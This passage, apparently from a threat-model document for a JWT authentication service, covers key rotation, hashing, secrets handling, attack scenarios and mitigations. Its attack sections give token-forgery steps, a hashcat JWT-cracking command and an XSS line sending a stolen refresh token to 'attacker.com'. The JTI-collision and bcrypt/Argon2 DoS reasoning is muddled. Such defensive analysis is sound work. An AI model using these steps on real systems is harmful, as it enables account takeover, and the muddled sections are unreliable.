Month N:
  ─ key-2024-01 is the active signing key
  ─ JWKS endpoint serves: [key-2024-01.pub]
  ─ All new JWTs are signed with key-2024-01
  ─ All issued JWTs have: kid="key-2024-01"

Month N+1 (Rotation day):
  Step 1: Generate new key pair: key-2025-01
  Step 2: Add key-2025-01.pub to JWKS (serve both keys)
           JWKS: [key-2024-01.pub, key-2025-01.pub]
  Step 3: Switch signing to key-2025-01
           All new JWTs: kid="key-2025-01"
  Step 4: Wait for all key-2024-01 JWTs to expire
           (max TTL = 15 minutes for access tokens)
  Step 5: Remove key-2024-01.pub from JWKS
           JWKS: [key-2025-01.pub]

Month N+2: Repeat
```

During Step 4's window, both keys are valid. Validators that look up `kid` in the JWKS will find the correct key for each token. No service restart required at any step.

If Step 4 is skipped and the old key is removed while old tokens are still valid, all users with tokens signed by `key-2024-01` will get 401 errors until their tokens expire or they re-login.

---

## 6. Data Flow

### Data Transformation at Each Stage

```
User Input (raw HTTP bytes)
  │
  ▼ TLS decryption (AEAD - AES-256-GCM)
  │
  ▼ HTTP/2 frame reassembly → HTTP request
  │
  ▼ JSON parse (UTF-8 string → object)
  │
  ▼ Input validation (email format, password length bounds)
  │
  ▼ Database query (parameterized → PostgreSQL wire protocol)
  │
  ▼ Password hash verification (Argon2id: string → boolean)
  │
  ▼ JWT construction:
  │    header (JSON) → base64url → string
  │    payload (JSON) → base64url → string
  │    signing_input = header_b64 + "." + payload_b64
  │    SHA-256(signing_input) → 32-byte digest
  │    RSA_sign(digest, private_key) → 256-byte signature (2048-bit RSA)
  │    base64url(signature) → string
  │    JWT = header_b64 + "." + payload_b64 + "." + sig_b64
  │
  ▼ Refresh token:
  │    CSPRNG(32 bytes) → raw bytes
  │    base64url(raw bytes) → opaque string (returned to client)
  │    SHA-256(raw bytes) → 32-byte hash → hex string (stored in DB)
  │
  ▼ JSON response construction
  │
  ▼ TLS encryption → HTTP/2 frames → TCP segments → network
```

### Serialization Formats

| Layer | Format | Encoding |
|---|---|---|
| HTTP body (login request) | JSON | UTF-8 |
| JWT header | JSON | base64url (no padding) |
| JWT payload | JSON | base64url (no padding) |
| JWT signature | Binary (RSA) | base64url (no padding) |
| Refresh token (client-facing) | Raw bytes | base64url |
| Refresh token (DB storage) | Hash | Hex string (SHA-256) |
| Redis keys/values | String | UTF-8 |
| PostgreSQL | Native types | PostgreSQL wire protocol |
| Audit events | Protobuf or JSON | Depends on Kafka schema |

### Data at Rest — What's Stored Where

| Data | Store | Format | Sensitive? |
|---|---|---|---|
| Password | PostgreSQL | Argon2id hash string | YES (hash, not plaintext) |
| User email | PostgreSQL | Plaintext (or encrypted-at-rest) | YES (PII) |
| Refresh token | PostgreSQL | SHA-256 hash (hex) | HASH ONLY |
| RSA private key | Secrets Manager / HSM | PEM or DER | CRITICAL |
| RSA public key | Served via JWKS | PEM / JWK JSON | PUBLIC |
| JWT blacklist entry | Redis | jti string | Low (jti is not sensitive) |
| Rate limit counter | Redis | Integer | No |
| Session (if used) | Redis | JSON | YES |

---

## 7. Security Controls

### Encryption in Transit

- TLS 1.3 on all external-facing endpoints. TLS 1.2 minimum; 1.0 and 1.1 disabled.
- **HSTS**: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` — browsers will refuse HTTP connections for 2 years.
- **HSTS preloading**: Submit to `https://hstspreload.org/` — hardcoded into browser builds. Eliminates the first-visit vulnerability window.
- Internal service-to-service: mTLS. Each service has a client certificate (issued by internal PKI, e.g., SPIFFE/SPIRE). The receiving service validates the caller's cert. Prevents lateral movement from a compromised service.
- Redis and PostgreSQL connections: TLS with certificate validation in `verify-full` mode.

### Password Hashing — Argon2id

Argon2id (RFC 9106) is the recommended KDF (Key Derivation Function) for password hashing as of 2023. It is memory-hard (resists GPU/ASIC attacks) and combines Argon2i (side-channel resistance) and Argon2d (GPU resistance).

**Parameters (minimum recommended for 2024):**
```
algorithm:   Argon2id
m (memory):  64MB (65536 KiB)
t (iterations): 3
p (parallelism): 4
output_len:  32 bytes
salt:        16 bytes (CSPRNG, unique per password, stored with hash)
```

The hash output is stored as a PHC string:
```
$argon2id$v=19$m=65536,t=3,p=4$<base64_salt>$<base64_hash>
```

**Why Argon2id over bcrypt/scrypt?**
- bcrypt: Truncates passwords at 72 bytes (silently — `hunter2` and `hunter2[junk]` are the same hash). Memory usage is fixed at 4KB — modern GPUs can run millions of bcrypt computations per second.
- scrypt: Memory-hard but less flexible parameter tuning; less tooling support.
- Argon2id: Configurable memory (64MB makes GPU parallelism impractical), no truncation, winner of Password Hashing Competition (2015).

### RSA Private Key Protection

The RSA private key is the most sensitive secret in the system. Compromise means an attacker can forge any JWT for any user, granting themselves any privileges, indefinitely.

Protection layers:
1. **Never stored on disk** in plaintext. Retrieved from AWS KMS or HashiCorp Vault at startup via IAM-authenticated API call.
2. **Cached in memory only**. Never written to a log, database, or file.
3. **HSM-backed KMS**: The private key is generated and stored in a Hardware Security Module. The KMS API performs signing operations inside the HSM — the raw key bytes never leave the HSM. This means even a compromised server process cannot extract the private key; it can only request signatures.
4. **Access control**: Only the Auth Service's IAM role has `kms:Sign` permission. Resource APIs have no KMS access (they only need the public key from JWKS).
5. **Audit**: Every KMS signing operation is logged in CloudTrail / Vault audit log.

### Input Validation

**Email:**
```python
# RFC 5322 compliant — not too strict
import re
EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')
if not EMAIL_REGEX.match(email):
    raise ValidationError("Invalid email format")
if len(email) > 254:  # RFC 5321 max
    raise ValidationError("Email too long")
```

**Password:**
```python
if len(password) < 8:
    raise ValidationError("Password too short")
if len(password) > 1024:  # Hard upper bound — prevent bcrypt DoS
    raise ValidationError("Password too long")
# Do NOT enforce complexity rules. NIST SP 800-63B recommends against them.
# DO check against known-breached password lists (HaveIBeenPwned API or local dataset).
```

**JWT input:** The JWT string itself arrives as a Bearer token. Before any parsing:
```python
if len(token) > 8192:  # Reasonable upper bound for a JWT
    raise InvalidToken("Token too large")
if token.count('.') != 2:
    raise InvalidToken("Malformed JWT structure")
```

### Secrets Handling

```
Production Secret Access Pattern:
─────────────────────────────────────────────────────────────
  Auth Service startup:
    1. EC2/ECS instance assumes IAM role (via instance metadata)
    2. Call AWS Secrets Manager: GetSecretValue("prod/auth/rsa_private_key")
    3. IAM validates: is this role allowed to read this secret?
    4. Secrets Manager returns the PEM-encoded private key
    5. Auth Service parses and caches the key in memory
    6. Secrets Manager call logged in CloudTrail
  
  Auth Service runtime:
    - Signs JWTs using the in-memory key
    - Never logs the key
    - Never writes the key to disk
    - Never includes the key in error messages
  
  Key rotation:
    - New version of secret created in Secrets Manager
    - Auth Service polls for new version every 5 minutes
    - Or: Receives SNS notification on secret rotation
    - Old key retained in cache for 15 minutes (JWT validity window)
─────────────────────────────────────────────────────────────
```

---

## 8. Attack Surface Mapping

### All Entry Points

```
═══════════════════════════════════════════════════════════════════════════════
  EXTERNAL ATTACK SURFACE (internet-accessible)
═══════════════════════════════════════════════════════════════════════════════

  Auth Service Endpoints:
  ─────────────────────────────────────────────────────────────────────────────
  POST  /auth/login           ← email + password, returns JWT
  POST  /auth/register        ← email + password, creates account
  POST  /auth/logout          ← JWT + refresh token, revokes session
  POST  /auth/token/refresh   ← refresh token (cookie), returns new JWT
  POST  /auth/password/reset  ← email, triggers reset flow
  PUT   /auth/password        ← JWT + new password, updates password
  GET   /.well-known/jwks.json ← public keys (intentionally public)

  Resource API Endpoints:
  ─────────────────────────────────────────────────────────────────────────────
  GET/POST/PUT/DELETE /api/v1/* ← JWT Bearer token required

  Indirect Surfaces:
  ─────────────────────────────────────────────────────────────────────────────
  - DNS hijacking (controls where clients connect)
  - TLS CA (cert mis-issuance)
  - CDN (cache poisoning, origin spoofing)
  - npm packages in frontend build (supply chain)
  - Client browsers (XSS, token theft)

═══════════════════════════════════════════════════════════════════════════════
  INTERNAL ATTACK SURFACE (VPC / private network)
═══════════════════════════════════════════════════════════════════════════════

  - PostgreSQL port 5432
  - Redis port 6380 (TLS)
  - AWS Secrets Manager API
  - Kafka brokers
  - Internal service-to-service HTTP APIs
  - Instance metadata endpoint (169.254.169.254) — IAM credential source

═══════════════════════════════════════════════════════════════════════════════
  INDIRECT / THIRD-PARTY SURFACES
═══════════════════════════════════════════════════════════════════════════════

  - AWS KMS / Vault (private key operations)
  - OCSP responder (cert revocation)
  - CT log providers (cert transparency)
  - HaveIBeenPwned API (if used for password breach check)
```

### Attack Surface Diagram

```
                                INTERNET
                                   │
                         ┌─────────▼──────────┐
                         │  WAF / Rate Limiter │  ← HTTP floods, scanner probes,
                         │  (Cloudflare/Shield)│    credential stuffing
                         └─────────┬──────────┘
                                   │
                         ┌─────────▼──────────┐
                         │  API Gateway / LB   │  ← TLS mis-config, host header
                         │  (nginx / ALB)      │    injection, HTTP smuggling
                         └────┬──────────┬─────┘
                              │          │
               ┌──────────────▼─┐    ┌───▼──────────────┐
               │  Auth Service  │    │  Resource APIs    │
               │                │    │                   │
               │  ATTACK PATHS: │    │  ATTACK PATHS:    │
               │  ─ Brute force │    │  ─ JWT forgery    │
               │    credentials │    │  ─ alg:none       │
               │  ─ SQLi (login)│    │  ─ Expired token  │
               │  ─ DoS (Argon2)│    │    accepted       │
               │  ─ JWT secrets │    │  ─ aud bypass     │
               │    exposure    │    │  ─ Blacklist skip │
               └──┬──────────┬──┘    └───────────────────┘
                  │          │
         ┌────────▼─┐  ┌─────▼──────┐
         │PostgreSQL│  │   Redis    │
         │          │  │            │
         │ ATTACK:  │  │ ATTACK:    │
         │ ─ SQLi   │  │ ─ Cache    │
         │ ─ creds  │  │   poison   │
         │   dump   │  │ ─ Blacklist│
         │          │  │   bypass   │
         └──────────┘  └────────────┘
                              │
                    ┌─────────▼──────────┐
                    │  Secrets Manager   │
                    │  / HSM / KMS       │
                    │  ATTACK: IAM abuse │
                    │  CRITICAL: RSA key │
                    │  exfiltration      │
                    └────────────────────┘

TRUST BOUNDARIES:
══════════════════════════════════════════════════════
[TB-1] Internet → API Gateway: Zero trust. All input untrusted.
[TB-2] API Gateway → Auth Service: Semi-trusted (internal network).
        Validate X-Forwarded-For. Don't trust without verification.
[TB-3] Auth Service → PostgreSQL: Trusted (private subnet + DB auth).
[TB-4] Auth Service → Redis: Trusted (private subnet + Redis auth).
[TB-5] Auth Service → Secrets Manager: IAM-authenticated. Audited.
[TB-6] Resource API → JWKS: Public endpoint. Trust the signature, not the source.
[TB-7] Browser → Any API: Untrusted. CORS + SameSite + CSRF tokens.
══════════════════════════════════════════════════════
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 — Algorithm Confusion Attack (`alg: none` and RS256→HS256)

**Attacker Assumptions:**
- Attacker has a valid JWT that is now expired.
- The system uses RS256. The RSA public key is available publicly at `/.well-known/jwks.json`.
- The target resource API uses a JWT library that accepts the `alg` field from the token header without restriction.

**Step-by-Step Execution — `alg: none`:**

1. Attacker takes any expired (or even fabricated) JWT.
2. Decodes the header: `{"alg":"RS256","typ":"JWT","kid":"key-2024-01"}`.
3. Constructs a new header: `{"alg":"none","typ":"JWT"}`.
4. Constructs a new payload with `"sub":"admin-uuid"`, `"roles":["admin"]`, far-future `exp`.
5. Encodes: `new_jwt = base64url(new_header) + "." + base64url(new_payload) + "."` (empty signature).
6. Sends request: `Authorization: Bearer <new_jwt>`.
7. If the library accepts `alg: none`, it skips signature verification. Attacker is now "admin."

**Step-by-Step Execution — RS256→HS256 (Key Confusion):**

1. Attacker fetches the RSA public key from `/.well-known/jwks.json`. This is a public endpoint.
2. Constructs a forged payload with `"sub":"admin-uuid"`, far-future `exp`.
3. Sets header: `{"alg":"HS256","typ":"JWT"}`.
4. Signs the JWT using HMAC-SHA256 with the RSA public key bytes as the HMAC secret.
5. If the library uses the `alg` field in the header to decide verification mode, and the public key is used as an HS256 secret, the signature verifies.
6. Attacker has admin access.

**Why This Works:**
Many JWT libraries (especially older versions of `jsonwebtoken`, `PyJWT`, `node-jsonwebtoken`) had this vulnerability. The library was designed to be flexible — verify with whatever algorithm the token claims. Attackers exploit this "helpfulness."

**Where Detection Could Happen:**
- Anomalous `alg` value in JWT header logged and alerted. `alg: none` or `alg: HS256` when the system uses RS256 should be an immediate alert.
- Failed verification logged as suspicious if followed immediately by a forged token attempt.
- IP-based anomaly: same IP issuing hundreds of malformed tokens.

**Mitigation:**
```python
# WRONG — trusts the token's alg claim
jwt.decode(token, public_key)

# CORRECT — forces the expected algorithm
jwt.decode(token, public_key, algorithms=["RS256"])
```

---

### 9.2 — JWT Secret Brute Force (HS256 Weak Secret)

**Attacker Assumptions:**
- The system uses HS256 (symmetric HMAC) instead of RS256.
- The HMAC secret is weak (short, dictionary-based, or derived from something guessable like the app name or a common pattern).
- Attacker has obtained a valid JWT (e.g., by registering a free account).

**Step-by-Step Execution:**

1. Attacker registers an account, obtains a valid HS256-signed JWT.
2. Attacker extracts `header.payload` (the signing input) and the `signature` from the JWT.
3. Runs `hashcat` or `jwt-cracker` against the JWT:
   ```
   hashcat -a 0 -m 16500 captured.jwt /usr/share/wordlists/rockyou.txt
   ```
   Mode 16500 = HMAC-SHA256 JWT. Hashcat can try billions of candidates per second on a GPU.
4. If the secret is weak (e.g., `secret`, `password`, `jwt_secret`, the app's hostname), it's found in seconds to hours.
5. Attacker uses the cracked secret to forge arbitrary JWTs:
   ```python
   forged = jwt.encode(
       {"sub": "admin-uuid", "roles": ["admin"], "exp": far_future},
       cracked_secret, algorithm="HS256"
   )
   ```
6. Attacker makes requests as any user, including admins.

**Why This Is Catastrophic:**
The HMAC secret signs ALL tokens. Compromise = forge tokens for every user, including admins. There's no `kid`-based mitigation — all HS256 tokens use the same secret.

**Where Detection Could Happen:**
- This attack is entirely offline after the JWT is captured. No detection until the forged token is used.
- Forged token with `sub` not matching any known user ID would be caught by a DB lookup (if the resource API validates user existence on each request — expensive).
- Anomalous `roles` values (e.g., a user suddenly appearing with `admin` role without a corresponding DB change).
- JWT `iat` in the far past for a user who last logged in recently.

**Mitigation:**
- Use RS256 (asymmetric). The private key never leaves the Auth Service and is never in a JWT that can be captured and brute-forced.
- If HS256 is used (legacy), secret must be 256-bit cryptographically random — not a human-memorable string. `secrets.token_bytes(32)` in Python.
- Rotate HS256 secrets periodically.

---

### 9.3 — Refresh Token Theft and Silent Account Takeover

**Attacker Assumptions:**
- Refresh tokens are stored in `localStorage` (common mistake).
- There is an XSS vulnerability in the application (or a compromised third-party script).

**Step-by-Step Execution:**

1. Attacker injects a malicious script (XSS or supply chain). Script executes in the victim's browser context.
2. Script reads the refresh token: `const rt = localStorage.getItem('refresh_token');`.
3. Script exfiltrates the token: `fetch('https://attacker.com/collect?t=' + rt)`.
4. Attacker receives the refresh token.
5. Attacker calls the auth service from their own server:
   ```
   POST /auth/token/refresh
   {"refresh_token": "<stolen_token>"}
   ```
6. Auth service issues a new access token and rotates the refresh token.
7. Attacker now has a fresh access token and a new refresh token (they continue the rotation chain).
8. Attacker uses the access token to impersonate the victim. They can call `/auth/token/refresh` indefinitely, maintaining access for 30 days (until the refresh token expiry).
9. If the victim tries to use the app, their original refresh token is now consumed (rotated). They get a 401 — effectively silently logged out.

**Why This Is Insidious:**
The victim doesn't know they've been compromised. They just think they got logged out. The attacker has persistent access for 30 days.

**Where Detection Could Happen:**
- **Refresh token rotation reuse detection**: If the auth service implements family-based reuse detection, and the victim re-authenticates (getting a new token family), the attacker's refresh tokens (from the old family) remain valid but a new family is active. This is insufficient.
- Better: If the victim's revoked token is presented (victim's old token after attacker rotated it), the auth service detects a double-use (revoked token presentation) and revokes the entire family. Both victim and attacker lose access. Victim must re-authenticate.
- IP geolocation anomaly: refresh token used from two different countries within minutes.

---

### 9.4 — Clock Skew / Timing Attack on JWT Expiry

**Attacker Assumptions:**
- The attacker has a legitimately-issued JWT that is 5–10 seconds expired.
- The resource API has a generous clock skew tolerance (e.g., 5 minutes) or a clock that is desynchronized.

**Step-by-Step Execution:**

1. Attacker (or legitimate user) obtains a JWT.
2. Waits until it expires (e.g., `exp` has passed by 30 seconds, but the server's clock is 5 minutes behind).
3. Sends the expired JWT to the resource API.
4. The resource API computes: `exp - now = -30s + 5m_skew = 4m30s remaining` — accepts the token as valid.

**More realistic variant:**
1. JWT is issued at `iat=T`. `exp=T+900` (15 minutes).
2. Attacker captures a JWT via log access or MitM (improbable with TLS, but possible via log dump).
3. Clock skew of 5 minutes means attacker can use the token until `T + 900 + 300 = T + 1200` (20 minutes).

**Compounded attack:**
1. Attacker computes exactly when the target's JWT will expire.
2. Fires a burst of requests just before expiry to complete a sensitive operation that requires the token.
3. If the operation is not idempotent, the attacker can exploit the window.

**Where Detection Could Happen:**
- NTP synchronization monitoring: alert if server clocks drift >1 second.
- Reject any token where `now - exp > MAX_CLOCK_SKEW` (set MAX_CLOCK_SKEW to 60 seconds, not 5 minutes).
- Log accepted tokens where `exp - now < 60s` as a warning metric.

---

### 9.5 — Argon2/bcrypt DoS via Long Password

**Attacker Assumptions:**
- The auth service hashes any password submitted to `/auth/login` without a length check.
- bcrypt (or Argon2 with high memory) is CPU/memory-intensive by design.
- The attacker can send concurrent requests.

**Step-by-Step Execution:**

1. Attacker fires 100 concurrent POST requests to `/auth/login`:
   ```json
   {"email": "attacker@evil.com", "password": "<1MB of 'A' characters>"}
   ```
2. Each request triggers an Argon2id computation over 1MB of input with 64MB memory allocation.
3. Each computation takes 300ms+ and 64MB of RAM.
4. 100 concurrent requests = 6.4GB of RAM consumed + all CPU cores saturated.
5. The auth service becomes unresponsive. Legitimate logins queue up indefinitely or fail with timeouts.

**Why This Works:**
The KDF's computational cost is a double-edged sword. It slows down attackers (brute-force), but also slows down the server if it processes arbitrarily long inputs.

**Note on bcrypt specifically:** bcrypt silently truncates input at 72 bytes. This means `hunter2` and `hunter2` + 1MB of garbage are the same hash. bcrypt is immune to this particular DoS vector — but it's vulnerable if the input isn't truncated before hashing with Argon2.

**Where Detection Could Happen:**
- Rate limiter: Block IP after 5 requests in 15 minutes (this is the correct mitigation).
- CPU/Memory spike on auth service → alert → autoscale or rate-limit.
- Response time degradation on `/auth/login` p99 → alert.

**Mitigation:**
```python
if len(password) > 1024:
    # Return 400 BEFORE doing any hashing
    raise ValidationError("Password exceeds maximum length")
```

---

### 9.6 — Audience Claim Bypass (Cross-Service JWT Reuse)

**Attacker Assumptions:**
- A multi-service architecture where Service A and Service B both accept JWTs issued by the same Auth Service.
- Service A grants the attacker a JWT. Service B has broader permissions.
- Service B does not validate the `aud` claim.

**Step-by-Step Execution:**

1. Attacker authenticates to Service A (lower-privilege service). Receives JWT with:
   ```json
   {"aud": ["https://service-a.example.com"], "roles": ["user"]}
   ```
2. Attacker presents this same JWT to Service B (higher-privilege service).
3. Service B validates the signature (valid — same signing key) and `exp` (not expired) but skips `aud` validation.
4. Service B accepts the token and grants access.
5. If Service B has higher privileges (e.g., it's an admin panel or a financial service), attacker has unauthorized access.

**Why This Works:**
The JWT signature is valid for any audience — the signature covers the entire payload including `aud`, but if the recipient doesn't check `aud`, it cannot enforce audience-specific restrictions. Services that skip `aud` validation are trusting tokens intended for others.

**Where Detection Could Happen:**
- Audit log: JWT `aud` claim does not match the receiving service identifier. Log and alert.
- API access pattern anomaly: a token issued for Service A suddenly appearing in Service B requests.

---

### 9.7 — JTI (JWT ID) Collision / Blacklist Bypass

**Attacker Assumptions:**
- The auth service uses short JTI values (e.g., 8-byte random instead of UUID-level entropy).
- The blacklist uses JTI as the key.
- Attacker can create accounts and obtain valid JWTs.

**Step-by-Step Execution:**

1. A legitimate user logs out. Their JWT's `jti=abc12345` is added to the Redis blacklist.
2. Attacker generates JWTs by repeatedly authenticating. Due to low-entropy JTI generation, eventually the attacker obtains a JWT with `jti=abc12345`.
3. Attacker's token has the same JTI but is a different, valid, non-revoked JWT.
4. **The blacklist check blocks the attacker's valid token.**

Actually, the attacker wants the *opposite* — their legitimate token to bypass the blacklist of someone else's revoked token. This is achieved if:

1. A victim is force-logged-out (their JWT blacklisted: `jti=abc12345`).
2. Attacker has an existing token with the *same* `jti` value (collision).
3. The attacker's token is blocked by the blacklist intended for the victim.

**More dangerous variant:** If the attacker can predict or influence the `jti` generation (e.g., it's a counter, a timestamp, or derived from user ID + timestamp), they can pre-compute collisions.

**Where Detection Could Happen:**
- Collision detection: Alert if a new JWT is issued with a JTI already in the blacklist.
- JTI space exhaustion: If the JTI space is small, monitor for rapid reuse.

**Mitigation:** JTI must be a UUID v4 (128-bit random). `import uuid; jti = str(uuid.uuid4())`. The probability of collision with 128-bit random values is negligible (birthday problem: would need ~2^64 tokens to have a 50% collision chance).

---

### 9.8 — Sensitive Data in JWT Payload

**Attacker Assumptions:**
- The JWT payload contains sensitive data (PII, secrets, internal system details).
- An attacker obtains a JWT (from logs, from the victim's localStorage, from a network tap on a non-TLS connection).

**Step-by-Step Execution:**

1. Attacker obtains a JWT: `eyJhbGci...eyJzdWIi...signature`.
2. Decodes the payload (no key required — base64url is not encryption):
   ```
   echo "eyJzdWIi..." | base64 -d
   ```
3. Reads the payload:
   ```json
   {
     "sub": "123",
     "email": "victim@corp.com",
     "ssn": "123-45-6789",
     "salary": 95000,
     "internal_system_key": "db_host=postgres.internal.example.com;port=5432"
   }
   ```

**Why This Works:**
JWT payloads are base64url-encoded, not encrypted. Any party with the token bytes can read the payload. The signature proves *integrity* (it hasn't been modified) but not *confidentiality*.

**Correct mental model:**
- JWT = signed message. Anyone can read it; only the signer can issue it.
- JWE (JSON Web Encryption) = encrypted message. Only authorized recipients can read it. Much less common.

**Mitigation:**
- Never put sensitive data (PII, financial data, secrets) in a JWT payload.
- JWT should contain only what's needed for authorization: `sub`, `roles`, `scope`, standard claims.
- Use JWE if confidentiality of the payload is required (rare; adds significant complexity).

---

## 10. Failure Points

### Under Load

**Argon2id computation saturates CPU:**
- Login is intentionally CPU-intensive (~300ms per hash). At 10 concurrent logins on a 2-core instance: all CPU consumed by hashing. All other operations (health checks, refreshes, logouts) queue up.
- **Mitigation**: Separate the hashing operation to a dedicated thread pool with a fixed size. Reject incoming login requests when the pool queue exceeds a threshold (backpressure). Scale Auth Service horizontally.

**PostgreSQL connection pool exhaustion:**
- Login requires 2 DB operations (user lookup + refresh token insert). Refresh requires 2 (lookup + update/insert). At high concurrency, all connections consumed.
- **Failure mode**: New requests wait for a connection, eventually time out. Users see login failures.
- **Mitigation**: PgBouncer connection pooling (transaction-mode pooling). Sets DB connections to a fixed pool shared across all app instances.

**Redis ENOMEM (out of memory):**
- The blacklist grows proportionally to logouts. The rate limit store grows with login attempts.
- If Redis runs out of memory with `maxmemory-policy: noeviction`, all writes fail. Rate limiting stops working (either fails open or closed depending on implementation).
- **Mitigation**: Set appropriate `maxmemory`. Use `volatile-lru` eviction policy (evict keys with TTL first). Monitor Redis memory usage with alerting at 80% capacity.

**JWKS endpoint unavailability:**
- If the Auth Service's JWKS endpoint is down and a Resource API's in-memory cache expires, the Resource API cannot validate any JWTs.
- **Failure mode**: All authenticated requests fail with 401. Full service outage.
- **Mitigation**: Resource APIs should cache the JWKS aggressively (6–24 hours). Never clear the cache without a replacement. Serve the JWKS from a static CDN-backed location as a fallback.

### Under Attack

**Credential stuffing against `/auth/login`:**
- Attacker replays leaked email/password pairs at high volume.
- Rate limiting by IP is bypassed by using a distributed botnet (each IP makes few requests).
- **Failure mode**: Legitimate users with compromised credentials in the leaked list are taken over; the IP-based rate limiter doesn't catch distributed attacks.
- **Mitigation**: Rate limit by email (not just IP). Require CAPTCHA after 3 failures per email. Check submitted passwords against HaveIBeenPwned. Alert on high `login_failure` rates per account.

**JWT blacklist Redis targeted attack:**
- Attacker forces millions of logouts (via CSRF or API abuse) to grow the Redis blacklist.
- Or: Attacker sends millions of bogus JTIs to the blacklist check endpoint.
- **Failure mode**: Redis memory exhaustion → blacklist checks fail → revoked tokens accepted.
- **Mitigation**: The blacklist has TTLs equal to JWT remaining validity. Maximum blacklist size is bounded by: `max_concurrent_users × 1` (one token per user). This is manageable. If an attacker forces mass logouts, they're also forcing users to re-authenticate, which is disruptive but doesn't cause a security failure.

### Common Misconfigurations

| Misconfiguration | Impact | Correct Configuration |
|---|---|---|
| `alg: none` accepted | JWT forgery | Explicitly allowlist `["RS256"]` in library config |
| HS256 with weak secret | JWT brute-force | RS256 asymmetric, or 256-bit random HS256 secret |
| No `aud` validation | Cross-service token reuse | Validate `aud` contains this service's identifier |
| No `iss` validation | Tokens from other systems accepted | Validate `iss` exactly matches expected issuer URL |
| Clock skew tolerance too large (>60s) | Extended token validity window | Max 60 seconds tolerance |
| Refresh tokens in `localStorage` | XSS token theft | `HttpOnly; Secure; SameSite=Strict` cookie |
| JWT payload contains PII | Payload readable without key | Only non-sensitive identifiers and auth claims in payload |
| No password length upper bound | Argon2 DoS | Reject passwords > 1024 bytes before hashing |
| Session ID not rotated on login | Session fixation | Rotate session ID (if sessions used alongside JWTs) |
| Access token lifetime too long (>1 hour) | Stolen token valid for too long | 15 minutes maximum for access tokens |
| JTI not included | Cannot blacklist individual tokens | Always include `jti` (UUID v4) |
| Public key cached without `kid` awareness | Key rotation breaks all validations | Cache by `kid`; handle unknown `kid` with JWKS refresh |
| Logging full JWT in access logs | Token exfiltration from logs | Never log JWT values; log only `jti` or a hash |

---

## 11. Mitigations

### Defense-in-Depth Strategy

**Layer 1 — Cryptographic Correctness:**
- Use RS256 (asymmetric). Private key never leaves the Auth Service or HSM.
- Constrain accepted algorithms to exactly `["RS256"]` in all validators.
- Use UUID v4 (128-bit random) for all JTI values.
- Validate ALL standard claims: `alg`, `iss`, `aud`, `exp`, `nbf`.
- Use Argon2id with sufficient parameters for password hashing. Enforce password length limits before hashing.

**Layer 2 — Token Lifecycle Management:**
- Access token lifetime: 15 minutes maximum. Short TTL limits blast radius of theft.
- Refresh token rotation: New token on every refresh. Revoke the old one. Detect reuse via family tracking.
- Refresh token storage: `HttpOnly; Secure; SameSite=Strict` cookie only.
- JTI blacklisting on logout: Accept the Redis dependency for security-critical systems.

**Layer 3 — Transport Security:**
- TLS 1.3 everywhere. HSTS with preloading. Disable HTTP entirely.
- CORS: Allowlist specific origins. `Vary: Origin` on all CORS responses.
- `SameSite=Strict` on all cookies to prevent CSRF.
- CSP to restrict XSS exfiltration vectors.

**Layer 4 — Rate Limiting and Anti-Abuse:**
- Rate limit login by email address: 5 attempts per 15 minutes.
- Rate limit refresh by IP + cookie fingerprint.
- Implement CAPTCHA (invisible/visible) after threshold failures.
- Implement account lockout with exponential backoff (not hard lockout — DoS risk).

**Layer 5 — Infrastructure and Secrets:**
- RSA private key in HSM-backed KMS. IAM-based access. Audit every signing operation.
- Private key never in environment variables, config files, or container images.
- PostgreSQL and Redis on private subnets. No internet access.
- Principle of least privilege for all IAM roles and DB users.

**Layer 6 — Monitoring and Response:**
- Alert on `alg: none` or unexpected `alg` values.
- Alert on JTI collision (JTI seen twice: once new, once blacklisted).
- Alert on refresh token reuse (same token presented twice before rotation).
- Alert on login failure spikes (credential stuffing indicator).
- Automated response: block IP on threshold. Require re-authentication on suspicious refresh patterns.

### Engineering Tradeoffs

| Decision | Security Benefit | Engineering Cost |
|---|---|---|
| RS256 over HS256 | No key distribution problem; private key never in tokens | Key rotation complexity; JWKS infrastructure |
| 15-minute access token TTL | Limits theft window | Silent refresh complexity; more token exchanges |
| Blacklist with Redis | Immediate revocation | Redis dependency on every request; SPOF risk |
| Argon2id password hashing | Brute-force resistance | CPU cost on login; autoscaling for login spikes |
| Refresh token rotation | Theft detection via reuse | Complexity; mobile app crash during rotation can log users out |
| `HttpOnly` cookie for refresh token | XSS can't steal it | SPA complexity; same-origin requirement |
| JWE (encrypted JWT) | Payload confidentiality | Significant library and key management complexity |

---

## 12. Observability

### Structured Log Format

Every auth event is logged as structured JSON:

```json
{
  "timestamp": "2024-11-15T10:23:45.123Z",
  "service": "auth-service",
  "version": "1.4.2",
  "event_type": "auth.login.success",
  "request_id": "req-uuid-abc123",
  "trace_id": "trace-uuid-def456",
  "user_id": "user-uuid-abc123",
  "ip_hash": "sha256:a1b2c3...",   // hashed — not raw IP (privacy)
  "ip_geo": "US-CA",               // country-region only
  "ua_hash": "sha256:d4e5f6...",   // hashed user agent
  "jti": "jwt-uuid-xyz789",        // for correlation with resource API logs
  "token_exp": 1700000900,
  "duration_ms": 312,
  "argon2_duration_ms": 298,
  "outcome": "success"
}
```

**What NEVER appears in logs:**
- JWT token values (they are credentials).
- Refresh token values.
- Passwords (obviously) — including failed attempt passwords.
- RSA private key.
- Full IP address (PII in some jurisdictions — hash it).
- Full email address in high-volume logs (hash or truncate: `u***@example.com`).

**Log levels:**
- `ERROR`: Token validation failure, DB connection failure, KMS unreachable, unexpected exceptions.
- `WARN`: Rate limit triggered, blacklisted token presented, clock skew detected, refresh token reuse detected.
- `INFO`: Login success, logout, token refresh. One line per event.
- `DEBUG`: Internal JWT parsing steps. NEVER in production (too verbose; may expose partial token data).

---

### Metrics (Prometheus)

```
# Counters — use these for alerting on rates
auth_login_attempts_total{outcome="success|failure", reason="bad_password|not_found|locked"}
auth_token_refresh_total{outcome="success|failure", reason="expired|revoked|reuse_detected"}
auth_logout_total
auth_jwt_validations_total{outcome="valid|expired|invalid_sig|alg_error|audience_mismatch"}
auth_rate_limit_hits_total{endpoint="/auth/login|/auth/refresh"}
auth_blacklist_checks_total{outcome="hit|miss"}
auth_blacklist_size_current (gauge)

# Histograms — for latency percentiles
auth_login_duration_seconds (histogram)
auth_argon2_duration_seconds (histogram)
auth_jwt_sign_duration_seconds (histogram)
auth_jwt_verify_duration_seconds (histogram)
auth_db_query_duration_seconds{operation="user_lookup|rt_insert|rt_rotate"}
